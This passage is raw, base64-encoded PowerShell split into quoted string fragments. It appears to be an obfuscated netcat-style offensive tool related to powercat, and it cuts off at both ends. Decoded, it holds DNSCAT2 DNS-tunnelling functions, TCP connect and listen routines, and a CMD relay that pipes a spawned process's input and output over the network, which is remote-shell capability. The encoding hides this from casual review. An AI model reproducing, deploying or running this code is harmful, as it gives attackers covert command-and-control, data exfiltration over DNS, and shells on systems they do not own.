ldFsyXQonLCcgICAgJEZ1bmNWYXJzWyJNJywnYXhNU0dEYXRhU2l6ZSJdICcsJz0gKDI0NCAtIChJbnZva2UnLCctQ29tbWFuZCAkRnVuY1ZhJywncnNbIkNyZWF0ZV9NU0ciXScsJyAtQXJndW1lbnRMaXN0IEAnLCcoJEZ1bmNWYXJzWyJTZXNzJywnaW9uSWQiXSwkRnVuY1ZhcicsJ3NbIlNlcU51bSJdLCRGdW4nLCdjVmFyc1siQWNrTnVtIl0sJywnIiIsJEZ1bmNWYXJzWyJUYScsJ2ciXSwkRnVuY1ZhcnNbIkQnLCdvbWFpbiJdKSkuTGVuZ3RoJywnKQogICAgaWYoJEZ1bmNWYScsJ3JzWyJNYXhNU0dEYXRhU2knLCd6ZSJdIC1sZSAwKXtyZXR1Jywncm4gIkRvbWFpbiBuYW1lICcsJ2lzIHRvbyBsb25nLiJ9CiAnLCcgICByZXR1cm4gJEZ1bmNWJywnYXJzCiAgfQogIGZ1bmN0aScsJ29uIFJlYWREYXRhX0ROUwonLCcgIHsKICAgIHBhcmFtKCRGJywndW5jVmFycykKICAgIGlmKCcsJyRnbG9iYWw6VmVyYm9zZSknLCd7JFZlcmJvc2UgPSAkVHJ1JywnZX0KICAgIAogICAgJFBhYycsJ2tldHNEYXRhID0gQCgpCiAnLCcgICAkUGFja2V0RGF0YSA9JywnICIiCiAgICAKICAgIGlmKCcsJyRGdW5jVmFyc1siSW5wdXQnLCdEYXRhIl0gLW5lICRudWxsJywnKQogICAgewogICAgICAkSCcsJ2V4ID0gKEludm9rZS1Db20nLCdtYW5kICRGdW5jVmFyc1siJywnQ29udmVydFRvLUhleEFycicsJ2F5Il0gLUFyZ3VtZW50TGknLCdzdCBAKCRGdW5jVmFyc1siJywnSW5wdXREYXRhIl0pKQogICcsJyAgICAkU2VjdGlvbkNvdW4nLCd0ID0gMAogICAgICAkUGFjJywna2V0Q291bnQgPSAwCiAgICcsJyAgIGZvcmVhY2goJENoYXInLCcgaW4gJEhleCkKICAgICAgJywnewogICAgICAgIGlmKCRTZScsJ2N0aW9uQ291bnQgLWdlIDMnLCcwKQogICAgICAgIHsKICAgJywnICAgICAgICRTZWN0aW9uQycsJ291bnQgPSAwCiAgICAgICAnLCcgICAkUGFja2V0RGF0YSArJywnPSAiLiIKICAgICAgICB9CicsJyAgICAgICAgaWYoJFBhY2snLCdldENvdW50IC1nZSAoJEZ1JywnbmNWYXJzWyJNYXhNU0dEYScsJ3RhU2l6ZSJdKSkKICAgICAnLCcgICB7CiAgICAgICAgICAkJywnUGFja2V0c0RhdGEgKz0gJCcsJ1BhY2tldERhdGEuVHJpbUUnLCduZCgiLiIpCiAgICAgICAgJywnICAkUGFja2V0Q291bnQgPScsJyAwCiAgICAgICAgICAkU2UnLCdjdGlvbkNvdW50ID0gMAogJywnICAgICAgICAgJFBhY2tldCcsJ0RhdGEgPSAiIgogICAgICAnLCcgIH0KICAgICAgICAkUGFjJywna2V0RGF0YSArPSAkQ2hhcicsJwogICAgICAgICRTZWN0aW8nLCduQ291bnQgKz0gMgogICAgJywnICAgICRQYWNrZXRDb3VudCcsJyArPSAyCiAgICAgIH0KICAnLCcgICAgJFBhY2tldERhdGEgJywnPSAkUGFja2V0RGF0YS5UcicsJ2ltRW5kKCIuIikKICAgICAnLCcgJFBhY2tldHNEYXRhICs9JywnICRQYWNrZXREYXRhCiAgICcsJyAgICRGdW5jVmFyc1siSW4nLCdwdXREYXRhIl0gPSAiIgogJywnICAgfQogICAgZWxzZQogICcsJyAgewogICAgICAkUGFja2UnLCd0c0RhdGEgPSBAKCIiKQogJywnICAgfQogICAgCiAgICBbYicsJ3l0ZVtdXSRSZXR1cm5pbmcnLCdEYXRhID0gQCgpCiAgICBmJywnb3JlYWNoKCRQYWNrZXREYScsJ3RhIGluICRQYWNrZXRzRGEnLCd0YSkKICAgIHsKICAgICAgJywndHJ5eyRNU0dQYWNrZXQgPScsJyBJbnZva2UtQ29tbWFuZCAnLCckRnVuY1ZhcnNbIkNyZWF0JywnZV9NU0ciXSAtQXJndW1lbicsJ3RMaXN0IEAoJEZ1bmNWYXInLCdzWyJTZXNzaW9uSWQiXSwkJywnRnVuY1ZhcnNbIlNlcU51bScsJyJdLCRGdW5jVmFyc1siQWMnLCdrTnVtIl0sJFBhY2tldERhJywndGEsJEZ1bmNWYXJzWyJUYScsJ2ciXSwkRnVuY1ZhcnNbIkQnLCdvbWFpbiJdKX0KICAgICAgJywnY2F0Y2h7IFdyaXRlLVZlcicsJ2Jvc2UgIkROU0NBVDI6IEYnLCdhaWxlZCB0byBjcmVhdGUgJywncGFja2V0LiIgOyAkRnVuYycsJ1ZhcnNbIkZhaWx1cmVzIl0nLCcgKz0gMSA7IGNvbnRpbnVlJywnIH0KICAgICAgdHJ5eyRQYScsJ2NrZXQgPSAoSW52b2tlLUMnLCdvbW1hbmQgJEZ1bmNWYXJzJywnWyJTZW5kUGFja2V0Il0gLScsJ0FyZ3VtZW50TGlzdCBAKCQnLCdNU0dQYWNrZXQsJEZ1bmNWJywnYXJzWyJETlNTZXJ2ZXIiXScsJywkRnVuY1ZhcnNbIkROU1AnLCdvcnQiXSkpfQogICAgICBjJywnYXRjaHsgV3JpdGUtVmVyYicsJ29zZSAiRE5TQ0FUMjogRmEnLCdpbGVkIHRvIHNlbmQgcGFjJywna2V0LiIgOyAkRnVuY1ZhcicsJ3NbIkZhaWx1cmVzIl0gKz0nLCcgMSA7IGNvbnRpbnVlIH0KJywnICAgICAgdHJ5CiAgICAgICcsJ3sKICAgICAgICAkRGVjb2QnLCdlZFBhY2tldCA9IChJbnZvJywna2UtQ29tbWFuZCAkRnVuYycsJ1ZhcnNbIkRlY29kZVBhY2snLCdldCJdIC1Bcmd1bWVudExpJywnc3QgQCgkUGFja2V0KSkKICcsJyAgICAgICBpZigkRGVjb2QnLCdlZFBhY2tldC5MZW5ndGggJywnLW5lIDQpeyBXcml0ZS1WZScsJ3Jib3NlICJETlNDQVQyOiAnLCdGYWlsdXJlIHRvIGRlY29kJywnZSBwYWNrZXQsIGRyb3BwaScsJ25nLi4uIjsgJEZ1bmNWYXInLCdzWyJGYWlsdXJlcyJdICs9JywnIDEgOyBjb250aW51ZSB9CicsJyAgICAgICAgJEZ1bmNWYXInLCdzWyJBY2tOdW0iXSA9ICREJywnZWNvZGVkUGFja2V0WzJdCicsJyAgICAgICAgJEZ1bmNWYXInLCdzWyJTZXFOdW0iXSA9ICREJywnZWNvZGVkUGFja2V0WzNdCicsJyAgICAgICAgJFJldHVybmknLCduZ0RhdGEgKz0gJERlY29kJywnZWRQYWNrZXRbMV0KICAgICcsJyAgfQogICAgICBjYXRjaHsnLCcgV3JpdGUtVmVyYm9zZSAiJywnRE5TQ0FUMjogRmFpbHVyZScsJyB0byBkZWNvZGUgcGFja2UnLCd0LCBkcm9wcGluZy4uLiIgJywnOyAkRnVuY1ZhcnNbIkZhaScsJ2x1cmVzIl0gKz0gMSA7IGMnLCdvbnRpbnVlIH0KICAgICAgJywnaWYoJERlY29kZWRQYWNrZScsJ3QgLWVxIDEpeyBXcml0ZS0nLCdWZXJib3NlICJETlNDQVQyJywnOiBGYWlsdXJlIHRvIGRlYycsJ29kZSBwYWNrZXQsIGRyb3AnLCdwaW5nLi4uIiA7ICRGdW5jJywnVmFyc1siRmFpbHVyZXMiXScsJyArPSAxIDsgY29udGludWUnLCcgfQogICAgfQogICAgCiAgJywnICBpZigkRnVuY1ZhcnNbIicsJ0ZhaWx1cmVzIl0gLWdlICQnLCdGdW5jVmFyc1siRmFpbHVyJywnZVRocmVzaG9sZCJdKXticicsJ2Vha30KICAgIAogICAgaWYnLCcoJFJldHVybmluZ0RhdGEgJywnLW5lIEAoKSkKICAgIHsKICcsJyAgICAgJEZ1bmNWYXJzWyInLCdBY2tOdW0iXSA9IChJbnZvJywna2UtQ29tbWFuZCAkRnVuYycsJ1ZhcnNbIkFja0RhdGEiXSAnLCctQXJndW1lbnRMaXN0IEAoJywnJFJldHVybmluZ0RhdGEsJCcsJ0Z1bmNWYXJzWyJBY2tOdW0nLCciXSkpCiAgICB9CiAgICByJywnZXR1cm4gJFJldHVybmluZycsJ0RhdGEsJEZ1bmNWYXJzCiAnLCcgfQogIGZ1bmN0aW9uIFdyJywnaXRlRGF0YV9ETlMKICB7CicsJyAgICBwYXJhbSgkRGF0YSwnLCckRnVuY1ZhcnMpCiAgICAkJywnRnVuY1ZhcnNbIklucHV0RCcsJ2F0YSJdID0gJEZ1bmNWYXInLCdzWyJFbmNvZGluZyJdLkdlJywndFN0cmluZygkRGF0YSkKICcsJyAgIHJldHVybiAkRnVuY1YnLCdhcnMKICB9CiAgZnVuY3RpJywnb24gQ2xvc2VfRE5TCiAgeycsJwogICAgcGFyYW0oJEZ1bmMnLCdWYXJzKQogICAgJEZJTlBhJywnY2tldCA9IEludm9rZS1DbycsJ21tYW5kICRGdW5jVmFyc1snLCciQ3JlYXRlX0ZJTiJdIC1BJywncmd1bWVudExpc3QgQCgkRicsJ3VuY1ZhcnNbIlNlc3Npb24nLCdJZCJdLCRGdW5jVmFyc1siJywnVGFnIl0sJEZ1bmNWYXJzWycsJyJEb21haW4iXSkKICAgIEknLCdudm9rZS1Db21tYW5kICRGJywndW5jVmFyc1siU2VuZFBhYycsJ2tldCJdIC1Bcmd1bWVudEwnLCdpc3QgQCgkRklOUGFja2V0JywnLCRGdW5jVmFyc1siRE5TUycsJ2VydmVyIl0sJEZ1bmNWYXInLCdzWyJETlNQb3J0Il0pIHwgJywnT3V0LU51bGwKICB9CiAgIycsJyMjIyMjIyMjIyMjIyMjIEQnLCdOUyBGVU5DVElPTlMgIyMjJywnIyMjIyMjIyMjIyMjCiAgCicsJyAgIyMjIyMjIyMjIyBUQ1AnLCcgRlVOQ1RJT05TICMjIyMjJywnIyMjIyMKICBmdW5jdGlvbicsJyBTZXR1cF9UQ1AKICB7CiAnLCcgICBwYXJhbSgkRnVuY1NlJywndHVwVmFycykKICAgICRjLCcsJyRsLCRwLCR0ID0gJEZ1bmMnLCdTZXR1cFZhcnMKICAgIGlmJywnKCRnbG9iYWw6VmVyYm9zZScsJyl7JFZlcmJvc2UgPSAkVHInLCd1ZX0KICAgICRGdW5jVmFyJywncyA9IEB7fQogICAgaWYoIScsJyRsKQogICAgewogICAgICAnLCckRnVuY1ZhcnNbImwiXSA9JywnICRGYWxzZQogICAgICAkUycsJ29ja2V0ID0gTmV3LU9iamUnLCdjdCBTeXN0ZW0uTmV0LlNvJywnY2tldHMuVGNwQ2xpZW50CicsJyAgICAgIFdyaXRlLVZlcmInLCdvc2UgIkNvbm5lY3RpbmcuJywnLi4iCiAgICAgICRIYW5kbCcsJ2UgPSAkU29ja2V0LkJlZ2knLCduQ29ubmVjdCgkYywkcCwkJywnbnVsbCwkbnVsbCkKICAgICcsJ30KICAgIGVsc2UKICAgIHsnLCcKICAgICAgJEZ1bmNWYXJzJywnWyJsIl0gPSAkVHJ1ZQogICcsJyAgICBXcml0ZS1WZXJib3MnLCdlICgiTGlzdGVuaW5nIG9uJywnIFswLjAuMC4wXSAocG9ydCcsJyAiICsgJHAgKyAiKSIpCiAnLCcgICAgICRTb2NrZXQgPSBOJywnZXctT2JqZWN0IFN5c3RlbScsJy5OZXQuU29ja2V0cy5UY3AnLCdMaXN0ZW5lciAkcAogICAgJywnICAkU29ja2V0LlN0YXJ0KCcsJykKICAgICAgJEhhbmRsZSAnLCc9ICRTb2NrZXQuQmVnaW5BJywnY2NlcHRUY3BDbGllbnQoJCcsJ251bGwsICRudWxsKQogICAnLCcgfQogICAgCiAgICAkU3RvJywncHdhdGNoID0gW1N5c3RlbScsJy5EaWFnbm9zdGljcy5TdG8nLCdwd2F0Y2hdOjpTdGFydE5lJywndygpCiAgICB3aGlsZSgkVCcsJ3J1ZSkKICAgIHsKICAgICAnLCcgaWYoJEhvc3QuVUkuUmF3JywnVUkuS2V5QXZhaWxhYmxlKScsJwogICAgICB7CiAgICAgICAnLCcgaWYoQCgxNywyNykgLWNvJywnbnRhaW5zICgkSG9zdC5VSScsJy5SYXdVSS5SZWFkS2V5KCInLCdOb0VjaG8sSW5jbHVkZUtlJywneURvd24sSW5jbHVkZUtleScsJ1VwIikuVmlydHVhbEtleUMnLCdvZGUpKQogICAgICAgIHsKJywnICAgICAgICAgIFdyaXRlLScsJ1ZlcmJvc2UgIkNUUkwgb3InLCcgRVNDIGNhdWdodC4gU3RvJywncHBpbmcgVENQIFNldHVwLicsJy4uIgogICAgICAgICAgaWYnLCcoJEZ1bmNWYXJzWyJsIl0pJywneyRTb2NrZXQuU3RvcCgpfScsJwogICAgICAgICAgZWxzZXsnLCckU29ja2V0LkNsb3NlKCl9JywnCiAgICAgICAgICAkU3RvcCcsJ3dhdGNoLlN0b3AoKQogICAnLCcgICAgICAgYnJlYWsKICAgJywnICAgICB9CiAgICAgIH0KICcsJyAgICAgaWYoJFN0b3B3YXQnLCdjaC5FbGFwc2VkLlRvdGFsJywnU2Vjb25kcyAtZ3QgJHQpCicsJyAgICAgIHsKICAgICAgICAnLCdpZighJGwpeyRTb2NrZXQuJywnQ2xvc2UoKX0KICAgICAgICcsJyBlbHNleyRTb2NrZXQuU3QnLCdvcCgpfQogICAgICAgICRTJywndG9wd2F0Y2guU3RvcCgpCicsJyAgICAgICAgV3JpdGUtVmUnLCdyYm9zZSAiVGltZW91dCEiJywnIDsgYnJlYWsKICAgICAgICcsJyBicmVhawogICAgICB9CiAnLCcgICAgIGlmKCRIYW5kbGUuJywnSXNDb21wbGV0ZWQpCiAgICcsJyAgIHsKICAgICAgICBpZignLCchJGwpCiAgICAgICAgewogJywnICAgICAgICAgdHJ5CiAgICcsJyAgICAgICB7CiAgICAgICAnLCcgICAgICRTb2NrZXQuRW5kJywnQ29ubmVjdCgkSGFuZGxlKScsJwogICAgICAgICAgICAkU3QnLCdyZWFtID0gJFNvY2tldC5HJywnZXRTdHJlYW0oKQogICAgICcsJyAgICAgICAkQnVmZmVyU2knLCd6ZSA9ICRTb2NrZXQuUmVjJywnZWl2ZUJ1ZmZlclNpemUKICcsJyAgICAgICAgICAgV3JpdGUnLCctVmVyYm9zZSAoIkNvbm5lJywnY3Rpb24gdG8gIiArICRjICcsJysgIjoiICsgJHAgKyAiIFsnLCd0Y3BdIHN1Y2NlZWRlZCEiJywnKQogICAgICAgICAgfQogICcsJyAgICAgICAgY2F0Y2h7JFMnLCdvY2tldC5DbG9zZSgpOyAkJywnU3RvcHdhdGNoLlN0b3AoKScsJzsgYnJlYWt9CiAgICAgICAnLCcgfQogICAgICAgIGVsc2UKJywnICAgICAgICB7CiAgICAgICcsJyAgICAkQ2xpZW50ID0gJFMnLCdvY2tldC5FbmRBY2NlcHRUJywnY3BDbGllbnQoJEhhbmRsZScsJykKICAgICAgICAgICRTdHInLCdlYW0gPSAkQ2xpZW50LkdlJywndFN0cmVhbSgpCiAgICAgICcsJyAgICAkQnVmZmVyU2l6ZSAnLCc9ICRDbGllbnQuUmVjZWl2JywnZUJ1ZmZlclNpemUKICAgICcsJyAgICAgIFdyaXRlLVZlcmInLCdvc2UgKCJDb25uZWN0aW9uJywnIGZyb20gWyIgKyAkQ2xpZScsJ250LkNsaWVudC5SZW1vdGUnLCdFbmRQb2ludC5BZGRyZXNzJywnLklQQWRkcmVzc1RvU3RyaScsJ25nICsgIl0gcG9ydCAiICsnLCcgJHBvcnQgKyAiIFt0Y3BdJywnIGFjY2VwdGVkIChzb3VyYycsJ2UgcG9ydCAiICsgJENsaWUnLCdudC5DbGllbnQuUmVtb3RlJywnRW5kUG9pbnQuUG9ydCArICcsJyIpIikKICAgICAgICB9CiAnLCcgICAgICAgYnJlYWsKICAgJywnICAgfQogICAgfQogICAgJCcsJ1N0b3B3YXRjaC5TdG9wKCknLCcKICAgIGlmKCRTb2NrZXQgJywnLWVxICRudWxsKXticmVhaycsJ30KICAgICRGdW5jVmFyc1snLCciU3RyZWFtIl0gPSAkU3RyJywnZWFtCiAgICAkRnVuY1ZhcicsJ3NbIlNvY2tldCJdID0gJFMnLCdvY2tldAogICAgJEZ1bmNWJywnYXJzWyJCdWZmZXJTaXplIicsJ10gPSAkQnVmZmVyU2l6ZQonLCcgICAgJEZ1bmNWYXJzWyJTJywndHJlYW1EZXN0aW5hdGlvbicsJ0J1ZmZlciJdID0gKE5ldy0nLCdPYmplY3QgU3lzdGVtLkJ5JywndGVbXSAkRnVuY1ZhcnNbIicsJ0J1ZmZlclNpemUiXSkKICAnLCcgICRGdW5jVmFyc1siU3RyJywnZWFtUmVhZE9wZXJhdGlvbicsJyJdID0gJEZ1bmNWYXJzWyInLCdTdHJlYW0iXS5CZWdpblJlJywnYWQoJEZ1bmNWYXJzWyJTdCcsJ3JlYW1EZXN0aW5hdGlvbkInLCd1ZmZlciJdLCAwLCAkRnVuJywnY1ZhcnNbIkJ1ZmZlclNpeicsJ2UiXSwgJG51bGwsICRudWwnLCdsKQogICAgJEZ1bmNWYXJzJywnWyJFbmNvZGluZyJdID0gTicsJ2V3LU9iamVjdCBTeXN0ZW0nLCcuVGV4dC5Bc2NpaUVuY29kJywnaW5nCiAgICAkRnVuY1ZhcicsJ3NbIlN0cmVhbUJ5dGVzUmUnLCdhZCJdID0gMQogICAgcmV0JywndXJuICRGdW5jVmFycwogICcsJ30KICBmdW5jdGlvbiBSZWEnLCdkRGF0YV9UQ1AKICB7CiAgJywnICBwYXJhbSgkRnVuY1ZhcicsJ3MpCiAgICAkRGF0YSA9ICQnLCdudWxsCiAgICBpZigkRnVuJywnY1ZhcnNbIlN0cmVhbUJ5dCcsJ2VzUmVhZCJdIC1lcSAwKXsnLCdicmVha30KICAgIGlmKCRGJywndW5jVmFyc1siU3RyZWFtUicsJ2VhZE9wZXJhdGlvbiJdLkknLCdzQ29tcGxldGVkKQogICAgJywnewogICAgICAkU3RyZWFtQicsJ3l0ZXNSZWFkID0gJEZ1bmMnLCdWYXJzWyJTdHJlYW0iXS5FJywnbmRSZWFkKCRGdW5jVmFycycsJ1siU3RyZWFtUmVhZE9wZXInLCdhdGlvbiJdKQogICAgICBpJywnZigkU3RyZWFtQnl0ZXNSZScsJ2FkIC1lcSAwKXticmVha30nLCcKICAgICAgJERhdGEgPSAkJywnRnVuY1ZhcnNbIlN0cmVhbScsJ0Rlc3RpbmF0aW9uQnVmZmUnLCdyIl1bMC4uKFtpbnRdJFN0JywncmVhbUJ5dGVzUmVhZC0xKScsJ10KICAgICAgJEZ1bmNWYXInLCdzWyJTdHJlYW1SZWFkT3BlJywncmF0aW9uIl0gPSAkRnVuYycsJ1ZhcnNbIlN0cmVhbSJdLkInLCdlZ2luUmVhZCgkRnVuY1ZhJywncnNbIlN0cmVhbURlc3RpbicsJ2F0aW9uQnVmZmVyIl0sIDAnLCcsICRGdW5jVmFyc1siQnVmJywnZmVyU2l6ZSJdLCAkbnVsbCcsJywgJG51bGwpCiAgICB9CiAnLCcgICByZXR1cm4gJERhdGEsJywnJEZ1bmNWYXJzCiAgfQogICcsJ2Z1bmN0aW9uIFdyaXRlRGEnLCd0YV9UQ1AKICB7CiAgICBwJywnYXJhbSgkRGF0YSwkRnVuYycsJ1ZhcnMpCiAgICAkRnVuY1YnLCdhcnNbIlN0cmVhbSJdLldyJywnaXRlKCREYXRhLCAwLCAkRCcsJ2F0YS5MZW5ndGgpCiAgICAnLCdyZXR1cm4gJEZ1bmNWYXJzJywnCiAgfQogIGZ1bmN0aW9uICcsJ0Nsb3NlX1RDUAogIHsKICAnLCcgIHBhcmFtKCRGdW5jVmFyJywncykKICAgIHRyeXskRnVuYycsJ1ZhcnNbIlN0cmVhbSJdLkMnLCdsb3NlKCl9CiAgICBjYXRjJywnaHt9CiAgICBpZigkRnVuYycsJ1ZhcnNbImwiXSl7JEZ1bmMnLCdWYXJzWyJTb2NrZXQiXS5TJywndG9wKCl9CiAgICBlbHNleycsJyRGdW5jVmFyc1siU29ja2UnLCd0Il0uQ2xvc2UoKX0KICB9JywnCiAgIyMjIyMjIyMjIyBUQycsJ1AgRlVOQ1RJT05TICMjIyMnLCcjIyMjIyMKICAKICAjIyMjJywnIyMjIyMjIENNRCBGVU5DVCcsJ0lPTlMgIyMjIyMjIyMjIwonLCcgIGZ1bmN0aW9uIFNldHVwJywnX0NNRAogIHsKICAgIHBhcicsJ2FtKCRGdW5jU2V0dXBWYXInLCdzKQogICAgaWYoJGdsb2JhJywnbDpWZXJib3NlKXskVmVyYicsJ29zZSA9ICRUcnVlfQogICAnLCcgJEZ1bmNWYXJzID0gQHt9JywnCiAgICAkUHJvY2Vzc1N0YScsJ3J0SW5mbyA9IE5ldy1PYmonLCdlY3QgU3lzdGVtLkRpYWduJywnb3N0aWNzLlByb2Nlc3NTdCcsJ2FydEluZm8KICAgICRQcm8nLCdjZXNzU3RhcnRJbmZvLkZpJywnbGVOYW1lID0gJEZ1bmNTZScsJ3R1cFZhcnNbMF0KICAgICQnLCdQcm9jZXNzU3RhcnRJbmZvJywnLlVzZVNoZWxsRXhlY3V0ZScsJyA9ICRGYWxzZQogICAgJFAnLCdyb2Nlc3NTdGFydEluZm8uJywnUmVkaXJlY3RTdGFuZGFyZCcsJ0lucHV0ID0gJFRydWUKICAnLCcgICRQcm9jZXNzU3RhcnRJJywnbmZvLlJlZGlyZWN0U3RhbicsJ2RhcmRPdXRwdXQgPSAkVHInLCd1ZQogICAgJFByb2Nlc3NTJywndGFydEluZm8uUmVkaXJlYycsJ3RTdGFuZGFyZEVycm9yID0nLCcgJFRydWUKICAgICRGdW5jJywnVmFyc1siUHJvY2VzcyJdICcsJz0gW1N5c3RlbS5EaWFnbm8nLCdzdGljcy5Qcm9jZXNzXTo6JywnU3RhcnQoJFByb2Nlc3NTdCcsJ2FydEluZm8pCiAgICBXcmknLCd0ZS1WZXJib3NlICgiU3RhJywncnRpbmcgUHJvY2VzcyAiICcsJysgJEZ1bmNTZXR1cFZhcnMnLCdbMF0gKyAiLi4uIikKICAgJywnICRGdW5jVmFyc1siUHJvYycsJ2VzcyJdLlN0YXJ0KCkgfCAnLCdPdXQtTnVsbAogICAgJEZ1JywnbmNWYXJzWyJTdGRPdXREZScsJ3N0aW5hdGlvbkJ1ZmZlciInLCddID0gTmV3LU9iamVjdCBTJywneXN0ZW0uQnl0ZVtdIDY1NScsJzM2CiAgICAkRnVuY1ZhcnMnLCdbIlN0ZE91dFJlYWRPcGVyJywnYXRpb24iXSA9ICRGdW5jVicsJ2Fyc1siUHJvY2VzcyJdLlMnLCd0YW5kYXJkT3V0cHV0LkJhJywnc2VTdHJlYW0uQmVnaW5SZScsJ2FkKCRGdW5jVmFyc1siU3QnLCdkT3V0RGVzdGluYXRpb25CJywndWZmZXIiXSwgMCwgNjU1MycsJzYsICRudWxsLCAkbnVsbCknLCcKICAgICRGdW5jVmFyc1siJywnU3RkRXJyRGVzdGluYXRpbycsJ25CdWZmZXIiXSA9IE5ldy0nLCdPYmplY3QgU3lzdGVtLkJ5JywndGVbXSA2NTUzNgogICAgJCcsJ0Z1bmNWYXJzWyJTdGRFcnInLCdSZWFkT3BlcmF0aW9uIl0gJywnPSAkRnVuY1ZhcnNbIlBybycsJ2Nlc3MiXS5TdGFuZGFyZEUnLCdycm9yLkJhc2VTdHJlYW0uJywnQmVnaW5SZWFkKCRGdW5jVicsJ2Fyc1siU3RkRXJyRGVzdGknLCduYXRpb25CdWZmZXIiXSwgJywnMCwgNjU1MzYsICRudWxsLCcsJyAkbnVsbCkKICAgICRGdW4nLCdjVmFyc1siRW5jb2RpbmciJywnXSA9IE5ldy1PYmplY3QgUycsJ3lzdGVtLlRleHQuQXNjaWknLCdFbmNvZGluZwogICAgcmV0JywndXJuICRGdW5jVmFycwogICcsJ30KICBmdW5jdGlvbiBSZWEnLCdkRGF0YV9DTUQKICB7CiAgJywnICBwYXJhbSgkRnVuY1ZhcicsJ3MpCiAgICBbYnl0ZVtdXSQnLCdEYXRhID0gQCgpCiAgICBpJywnZigkRnVuY1ZhcnNbIlN0ZCcsJ091dFJlYWRPcGVyYXRpb24nLCciXS5Jc0NvbXBsZXRlZCkKJywnICAgIHsKICAgICAgJFN0ZCcsJ091dEJ5dGVzUmVhZCA9ICQnLCdGdW5jVmFyc1siUHJvY2VzJywncyJdLlN0YW5kYXJkT3V0cCcsJ3V0LkJhc2VTdHJlYW0uRW4nLCdkUmVhZCgkRnVuY1ZhcnNbJywnIlN0ZE91dFJlYWRPcGVyYScsJ3Rpb24iXSkKICAgICAgaWYnLCcoJFN0ZE91dEJ5dGVzUmVhJywnZCAtZXEgMCl7YnJlYWt9CicsJyAgICAgICREYXRhICs9ICQnLCdGdW5jVmFyc1siU3RkT3V0JywnRGVzdGluYXRpb25CdWZmZScsJ3IiXVswLi4oW2ludF0kU3QnLCdkT3V0Qnl0ZXNSZWFkLTEpJywnXQogICAgICAkRnVuY1ZhcicsJ3NbIlN0ZE91dFJlYWRPcGUnLCdyYXRpb24iXSA9ICRGdW5jJywnVmFyc1siUHJvY2VzcyJdLicsJ1N0YW5kYXJkT3V0cHV0LkInLCdhc2VTdHJlYW0uQmVnaW5SJywnZWFkKCRGdW5jVmFyc1siUycsJ3RkT3V0RGVzdGluYXRpb24nLCdCdWZmZXIiXSwgMCwgNjU1JywnMzYsICRudWxsLCAkbnVsbCcsJykKICAgIH0KICAgIGlmKCQnLCdGdW5jVmFyc1siU3RkRXJyJywnUmVhZE9wZXJhdGlvbiJdLicsJ0lzQ29tcGxldGVkKQogICAnLCcgewogICAgICAkU3RkRXJyJywnQnl0ZXNSZWFkID0gJEZ1bicsJ2NWYXJzWyJQcm9jZXNzIl0nLCcuU3RhbmRhcmRFcnJvci5CJywnYXNlU3RyZWFtLkVuZFJlYScsJ2QoJEZ1bmNWYXJzWyJTdGQnLCdFcnJSZWFkT3BlcmF0aW9uJywnIl0pCiAgICAgIGlmKCRTdCcsJ2RFcnJCeXRlc1JlYWQgLWUnLCdxIDApe2JyZWFrfQogICAgJywnICAkRGF0YSArPSAkRnVuYycsJ1ZhcnNbIlN0ZEVyckRlc3QnLCdpbmF0aW9uQnVmZmVyIl1bJywnMC4uKFtpbnRdJFN0ZEVycicsJ0J5dGVzUmVhZC0xKV0KICAnLCcgICAgJEZ1bmNWYXJzWyJTJywndGRFcnJSZWFkT3BlcmF0aScsJ29uIl0gPSAkRnVuY1ZhcnMnLCdbIlByb2Nlc3MiXS5TdGFuJywnZGFyZEVycm9yLkJhc2VTdCcsJ3JlYW0uQmVnaW5SZWFkKCQnLCdGdW5jVmFyc1siU3RkRXJyJywnRGVzdGluYXRpb25CdWZmZScsJ3IiXSwgMCwgNjU1MzYsICQnLCdudWxsLCAkbnVsbCkKICAgJywnIH0KICAgIHJldHVybiAkRCcsJ2F0YSwkRnVuY1ZhcnMKICAnLCd9CiAgZnVuY3Rpb24gV3JpJywndGVEYXRhX0NNRAogIHsKICcsJyAgIHBhcmFtKCREYXRhLCQnLCdGdW5jVmFycykKICAgICRGJywndW5jVmFyc1siUHJvY2VzcycsJyJdLlN0YW5kYXJkSW5wdXQnLCcuV3JpdGVMaW5lKCRGdW5jJywnVmFyc1siRW5jb2RpbmciXScsJy5HZXRTdHJpbmcoJERhdGEnLCcpLlRyaW1FbmQoImByIikuJywnVHJpbUVuZCgiYG4iKSkKICcsJyAgIHJldHVybiAkRnVuY1YnLCdhcnMKICB9CiAgZnVuY3RpJywnb24gQ2xvc2VfQ01ECiAgeycsJwogICAgcGFyYW0oJEZ1bmMnLCdWYXJzKQogICAgJEZ1bmNWJywnYXJzWyJQcm9jZXNzIl0gfCcsJyBTdG9wLVByb2Nlc3MKICAnLCd9ICAKICAjIyMjIyMjIyMjJywnIENNRCBGVU5DVElPTlMgIycsJyMjIyMjIyMjIwogIAogICMnLCcjIyMjIyMjIyMgUE9XRVJTJywnSEVMTCBGVU5DVElPTlMgIycsJyMjIyMjIyMjIwogIGZ1bmMnLCd0aW9uIE1haW5fUG93ZXJzJywnaGVsbAogIHsKICAgIHBhcicsJ2FtKCRTdHJlYW0xU2V0dXAnLCdWYXJzKSAgIAogICAgdHJ5JywnCiAgICB7CiAgICAgICRlbicsJ2NvZGluZyA9IE5ldy1PYmonLCdlY3QgU3lzdGVtLlRleHQuJywnQXNjaWlFbmNvZGluZwogICcsJyAgICBbYnl0ZVtdXSRJbnAnLCd1dFRvV3JpdGUgPSBAKCkKJywnICAgICAgaWYoJGkgLW5lICcsJyRudWxsKQogICAgICB7CiAnLCcgICAgICAgV3JpdGUtVmVyJywnYm9zZSAiSW5wdXQgZnJvbScsJyAtaSBkZXRlY3RlZC4uLiInLCcKICAgICAgICBpZihUZXN0JywnLVBhdGggJGkpeyBbYnl0ZScsJ1tdXSRJbnB1dFRvV3JpdGUnLCcgPSAoW2lvLmZpbGVdOjpSJywnZWFkQWxsQnl0ZXMoJGkpKScsJyB9CiAgICAgICAgZWxzZWknLCdmKCRpLkdldFR5cGUoKS5OJywnYW1lIC1lcSAiQnl0ZVtdIicsJyl7IFtieXRlW11dJElucHUnLCd0VG9Xcml0ZSA9ICRpIH0KJywnICAgICAgICBlbHNlaWYoJCcsJ2kuR2V0VHlwZSgpLk5hbWUnLCcgLWVxICJTdHJpbmciKXsgJywnW2J5dGVbXV0kSW5wdXRUbycsJ1dyaXRlID0gJEVuY29kaW4nLCdnLkdldEJ5dGVzKCRpKSB9JywnCiAgICAgICAgZWxzZXtXcicsJ2l0ZS1Ib3N0ICJVbnJlY28nLCdnbmlzZWQgaW5wdXQgdHlwJywnZS4iIDsgcmV0dXJufQogICcsJyAgICB9CiAgICAKICAgICAnLCcgV3JpdGUtVmVyYm9zZSAiJywnU2V0dGluZyB1cCBTdHJlYScsJ20gMS